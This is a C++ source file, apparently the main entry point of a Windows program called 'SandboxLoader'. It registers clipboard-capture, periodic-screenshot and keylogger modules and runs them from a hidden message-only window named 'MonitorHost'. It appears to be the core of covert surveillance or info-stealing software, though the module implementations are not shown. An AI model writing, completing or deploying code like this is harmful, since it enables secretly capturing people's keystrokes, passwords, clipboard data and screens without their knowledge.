#include <Windows.h>
#include <iostream>
#include "SandboxLoader/Modules/ModuleRegistry.h"

#include "SandboxLoader/CollectorModules/ClipboardModule.h"
#include "SandboxLoader/CollectorModules/ScreenshotModule.h"
#include "SandboxLoader/CollectorModules/KeyloggerModule.h"



static HINSTANCE       g_hInst = nullptr;
static HWND            g_hwnd = nullptr;
static ModuleRegistry  g_registry;          

LRESULT CALLBACK WndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    switch (uMsg)
    {
    case WM_CREATE:
        g_registry.OnCreate(hwnd);
        return 0;

    case WM_DESTROY:
        g_registry.OnDestroy(hwnd);
        ::PostQuitMessage(0);
        return 0;

    default:
        if (g_registry.Dispatch(hwnd, uMsg, wParam, lParam))
            return 0;                     
        return ::DefWindowProcW(hwnd, uMsg, wParam, lParam);
    }
}

static HRESULT CreateMessageWindow()
{
    WNDCLASSW wc = {};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = g_hInst;
    wc.lpszClassName = L"MonitorHost";

    if (!::RegisterClassW(&wc))
    {
        DWORD err = ::GetLastError();
        if (err != ERROR_CLASS_ALREADY_EXISTS)
            return HRESULT_FROM_WIN32(err);
    }
    
    g_hwnd = ::CreateWindowExW(
        0, L"MonitorHost", L"", 0,
        0, 0, 0, 0,
        HWND_MESSAGE, nullptr, g_hInst, nullptr);

    return g_hwnd ? S_OK : HRESULT_FROM_WIN32(::GetLastError());
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int)
{
    g_hInst = hInstance;


    g_registry.Register(std::make_unique<ClipboardModule>());


    g_registry.Register(std::make_unique<ScreenshotModule>(30));

    g_registry.Register(std::make_unique<KeyloggerModule>());

    if (FAILED(CreateMessageWindow()))
    {
        std::cerr << "[main] Failed to create message window\n";
        return 1;
    }

   
    MSG msg;
    while (::GetMessage(&msg, nullptr, 0, 0) > 0)
    {
        ::TranslateMessage(&msg); 
        ::DispatchMessage(&msg);
    }

    return static_cast<int>(msg.wParam);
}
